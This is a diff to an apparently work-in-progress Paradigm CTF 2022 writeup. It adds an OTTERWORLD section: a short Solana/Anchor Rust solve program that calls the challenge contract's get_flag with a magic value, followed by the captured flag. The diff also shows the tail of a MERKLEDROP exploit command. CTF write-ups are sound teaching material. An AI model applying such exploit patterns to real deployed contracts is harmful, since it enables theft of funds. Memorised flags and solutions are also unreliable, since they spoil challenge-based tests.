@@ -1,8 +1,9 @@
-# Paradigm CTF 2022 Writeup
+# [WIP] Paradigm CTF 2022 Writeup
 
 **Table of Contents**
 - [LOCKBOX2](#lockbox2)
 - [MERKLEDROP](#merkledrop)
+- [OTTERWORLD](#otterworld)
 - [RANDOM](#random)
 - [SOURCECODE](#sourcecode)
 - [TRAPDOOOR](#trapdooor)
@@ -80,6 +81,33 @@ forge script MerkleDropExploitScript --fork-url $RPC_PARADIGM --private-key $PRI
 ```
 
 Flag `PCTF{N1C3_Pr00F_8r0}`
+
+## OTTERWORLD
+
+```rs
+#[program]
+pub mod solve {
+    use super::*;
+
+    pub fn get_flag(ctx: Context<GetFlag>) -> Result<()> {
+
+        let cpi_accounts = chall::cpi::accounts::GetFlag {
+            flag: ctx.accounts.flag.clone(),
+            payer: ctx.accounts.payer.to_account_info(),
+            system_program: ctx.accounts.system_program.to_account_info(),
+            rent: ctx.accounts.rent.to_account_info(),
+        };
+
+        let cpi_ctx = CpiContext::new(ctx.accounts.chall.to_account_info(), cpi_accounts);
+
+        chall::cpi::get_flag(cpi_ctx, 0x1337 * 0x7331)?;
+
+        Ok(())
+    }
+}
+```
+
+Flag: `PCTF{0tt3r_w0r1d_8c01j3}`
 
 ## RANDOM
 
